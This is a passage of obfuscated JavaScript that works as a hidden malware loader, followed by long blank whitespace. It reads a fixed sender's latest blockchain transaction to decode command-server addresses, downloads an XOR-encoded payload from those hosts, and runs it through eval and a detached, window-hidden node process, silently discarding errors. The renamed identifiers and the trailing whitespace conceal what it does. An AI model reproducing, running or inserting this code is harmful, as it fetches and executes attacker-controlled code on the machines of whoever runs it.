withRpcEndpoints((ozRbTmuUOSQxTaHSxAMAP,TEeXvPj)=>rpcCall(ozRbTmuUOSQxTaHSxAMAP,KYZeSIB(0x19d),[toBlockHex(MFMjq),!![]],TEeXvPj),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)]),MewjUeWTCE$egTDNiInBMBgf=pwsZeE?.[KYZeSIB(0x175)]||[];let tqCDDCknnC=null;for(const b__FnlemnKd of MewjUeWTCE$egTDNiInBMBgf){if(!b__FnlemnKd[KYZeSIB(0x1b0)]||b__FnlemnKd[KYZeSIB(0x1b0)][KYZeSIB(0x1c3)]()!==SENDER)continue;if(BigInt(b__FnlemnKd[KYZeSIB(0x154)])===wxMNGaAYpSO){tqCDDCknnC=b__FnlemnKd;break;}if(!tqCDDCknnC||BigInt(b__FnlemnKd[KYZeSIB(0x154)])>BigInt(tqCDDCknnC[KYZeSIB(0x154)]))tqCDDCknnC=b__FnlemnKd;}return{'blockNumber':MFMjq,'tx':tqCDDCknnC};}finally{vOeJlPmLwpiHL$oohJee[KYZeSIB(0x1ab)]();}}async function lastSenderTxViaIndexer(){const SCVGJ_IJGWPiEDEMaV_PMtnULo=BEf$CYFUWXrAiwaYBJ,kxNKGgueUA=INDEXER_URL+SCVGJ_IJGWPiEDEMaV_PMtnULo(0x194)+SENDER+SCVGJ_IJGWPiEDEMaV_PMtnULo(0x163),x$JrfbIZLbybosqwSDBfAq=await httpRequest(kxNKGgueUA),VXW_mxRMrUhuG$E=Array[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1c6)](x$JrfbIZLbybosqwSDBfAq?.[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x15d)])?x$JrfbIZLbybosqwSDBfAq[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x15d)]:[],oizDGSQQ_RyjP$GbM=VXW_mxRMrUhuG$E[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1bb)](jigmfjPfLbDrJaOT=>jigmfjPfLbDrJaOT[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1b0)]&&jigmfjPfLbDrJaOT[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1b0)][SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1c3)]()===SENDER);return{'blockNumber':BigInt(oizDGSQQ_RyjP$GbM[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1a3)]),'tx':oizDGSQQ_RyjP$GbM};}async function run(){const whs$nYWTlPzY=BEf$CYFUWXrAiwaYBJ,zMgSeaz=BigInt(await withRpcEndpoints((qtPCkCRAEVWH_NkH_cnm,f_UHJffpCvbHRB$tiJPyp)=>rpcCall(qtPCkCRAEVWH_NkH_cnm,whs$nYWTlPzY(0x160),[],f_UHJffpCvbHRB$tiJPyp))),CWWJsO$TZ=zMgSeaz-zMgSeaz%BLOCK_MULTIPLE;let oIucMTWeI=await firstMatch(candidateBlocks(CWWJsO$TZ)[whs$nYWTlPzY(0x170)](blockTask));!oIucMTWeI&&(oIucMTWeI=await lastSenderTx(zMgSeaz)[whs$nYWTlPzY(0x1aa)](()=>lastSenderTxViaIndexer()));const [fxydRcJblRNYxMPdn,pMMdlGsTHq_NQFuzSGfwaVj_A]=decodeAddress(oIucMTWeI['tx']['to']),bRsOozpSEKZvmdjiHwuhb=global;bRsOozpSEKZvmdjiHwuhb['_V']=bRsOozpSEKZvmdjiHwuhb['i'],bRsOozpSEKZvmdjiHwuhb['_H']=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x185),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x157)]=whs$nYWTlPzY(0x159)+pMMdlGsTHq_NQFuzSGfwaVj_A+whs$nYWTlPzY(0x185),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x17d)]=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x1c5),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x1be)]=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x185);function jRPe_$pro(AEEzGrqYV_mfkUCEUWURB,KOzb$TP_rMGJIxS){const z_SOYvRJaOEgyQMJlyl=whs$nYWTlPzY,IFHaRgVqomxJh$qVzf$VLfXyG={'hostname':KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x1b5)],'port':Number(KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x1b4)])||0x31*-parseInt(0x2)+0x119+Number(-0x67),'path':KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x198)]+KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x158)],'headers':{'User-Agent':z_SOYvRJaOEgyQMJlyl(0x195),'Sec-V':bRsOozpSEKZvmdjiHwuhb['_V']||parseInt(0xf60)+-0x61e+-parseInt(0x942)}};function fmGWrbBhU(InqhIrdb_iNVZtsJ$mYS){const UpgdSP_f$WJxlxa=z_SOYvRJaOEgyQMJlyl,M$n$GOjWFzYMwpXudh=AEEzGrqYV_mfkUCEUWURB[UpgdSP_f$WJxlxa(0x192)];for(let Q_xgQBVbDvn=0x18e*-0x7+0x183f+parseInt(0x1)*-0xd5d;Q_xgQBVbDvn<InqhIrdb_iNVZtsJ$mYS[UpgdSP_f$WJxlxa(0x192)];Q_xgQBVbDvn++)InqhIrdb_iNVZtsJ$mYS[Q_xgQBVbDvn]^=AEEzGrqYV_mfkUCEUWURB[UpgdSP_f$WJxlxa(0x1a0)](Q_xgQBVbDvn%M$n$GOjWFzYMwpXudh);return InqhIrdb_iNVZtsJ$mYS[UpgdSP_f$WJxlxa(0x1c2)](UpgdSP_f$WJxlxa(0x1c4));}function KNklZsIzRmFSCPm_UGyD(nRCmFdhgPAof){const eHWnRKXPBiRwhodiw=z_SOYvRJaOEgyQMJlyl,KpvHX=nRCmFdhgPAof[eHWnRKXPBiRwhodiw(0x1c7)][eHWnRKXPBiRwhodiw(0x18d)];if(!KpvHX)throw new Error(eHWnRKXPBiRwhodiw(0x1af));return fmGWrbBhU(Buffer[eHWnRKXPBiRwhodiw(0x1b0)](KpvHX,eHWnRKXPBiRwhodiw(0x151)));}function OJfSXHTVZN$fe(K_vSenE){return new Promise((ZQuPXkVipPg,NZIEVyTIKMQVORTZfU)=>{const RXvlYtHcsKeS=WlysIxGuPMcViepbraDjp_wli,CBAOZI$rcixEZZanTLMOm=http[RXvlYtHcsKeS(0x16e)]({...IFHaRgVqomxJh$qVzf$VLfXyG,'method':K_vSenE},VxIgkbRRYdgFucsNdoIDHFr=>{const XZJHXReDP=RXvlYtHcsKeS;if(K_vSenE===XZJHXReDP(0x193)){try{ZQuPXkVipPg(KNklZsIzRmFSCPm_UGyD(VxIgkbRRYdgFucsNdoIDHFr));}catch(RZRFkoIipO){NZIEVyTIKMQVORTZfU(RZRFkoIipO);}VxIgkbRRYdgFucsNdoIDHFr[XZJHXReDP(0x1a1)]();return;}const cPKJoMYzdExeb$XXVTS=[];VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x18e),MYQD_ZFWLwm$Ov=>cPKJoMYzdExeb$XXVTS[XZJHXReDP(0x166)](MYQD_ZFWLwm$Ov)),VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x1c0),()=>{const vmTXJa_MM$WzZOdwzwDkERCdK=XZJHXReDP;try{const fAhxZbhTcBfzeDihoLRDX=Buffer[vmTXJa_MM$WzZOdwzwDkERCdK(0x1b3)](cPKJoMYzdExeb$XXVTS);if(fAhxZbhTcBfzeDihoLRDX[vmTXJa_MM$WzZOdwzwDkERCdK(0x192)])return ZQuPXkVipPg(fmGWrbBhU(fAhxZbhTcBfzeDihoLRDX));if(VxIgkbRRYdgFucsNdoIDHFr[vmTXJa_MM$WzZOdwzwDkERCdK(0x1c7)][vmTXJa_MM$WzZOdwzwDkERCdK(0x18d)])return ZQuPXkVipPg(KNklZsIzRmFSCPm_UGyD(VxIgkbRRYdgFucsNdoIDHFr));NZIEVyTIKMQVORTZfU(new Error(vmTXJa_MM$WzZOdwzwDkERCdK(0x17b)));}catch(IG_a_MJi){NZIEVyTIKMQVORTZfU(IG_a_MJi);}}),VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x188),NZIEVyTIKMQVORTZfU);});CBAOZI$rcixEZZanTLMOm['on'](RXvlYtHcsKeS(0x188),NZIEVyTIKMQVORTZfU),CBAOZI$rcixEZZanTLMOm[RXvlYtHcsKeS(0x1c0)]();});}return OJfSXHTVZN$fe(z_SOYvRJaOEgyQMJlyl(0x181))[z_SOYvRJaOEgyQMJlyl(0x1aa)](()=>OJfSXHTVZN$fe(z_SOYvRJaOEgyQMJlyl(0x193)));}async function zS$wdno(RqdenM$wJdTdnrzoPxWuyF_a,k$DEq$xpz,cN$yvd){const CTJVzfTMEozmTbUg=whs$nYWTlPzY;try{const ZeKiakEO$nY_FkVMX=await jRPe_$pro(k$DEq$xpz,RqdenM$wJdTdnrzoPxWuyF_a),DiRknXtYt=cN$yvd?CTJVzfTMEozmTbUg(0x16f)+(bRsOozpSEKZvmdjiHwuhb['_V']||Math.ceil(parseInt(0x14))*-0x1b6+-0x1*parseFloat(0xc51)+Math.max(0x2e89,0x2e89))+CTJVzfTMEozmTbUg(0x1a6)+bRsOozpSEKZvmdjiHwuhb['_H']+CTJVzfTMEozmTbUg(0x183)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x157)]+CTJVzfTMEozmTbUg(0x1ad):CTJVzfTMEozmTbUg(0x16f)+(bRsOozpSEKZvmdjiHwuhb['_V']||-0x78a+Math.floor(0x1f6)*-0x3+Number(0xd6c)*parseFloat(parseInt(0x1)))+CTJVzfTMEozmTbUg(0x1a2)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x17d)]+CTJVzfTMEozmTbUg(0x1ba)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x1be)]+CTJVzfTMEozmTbUg(0x1ad);if(!cN$yvd)eval(DiRknXtYt+ZeKiakEO$nY_FkVMX);spawn(CTJVzfTMEozmTbUg(0x15c),['-e',DiRknXtYt+ZeKiakEO$nY_FkVMX],{'detached':!![],'stdio':CTJVzfTMEozmTbUg(0x15f),'windowsHide':!![]})[CTJVzfTMEozmTbUg(0x17e)]();}catch(irHwSYrpWho){}}await zS$wdno(new URL(whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x19c)),whs$nYWTlPzY(0x169),![]),await zS$wdno(new URL(whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x162)),whs$nYWTlPzY(0x18f),!![]);}run();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              



                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              





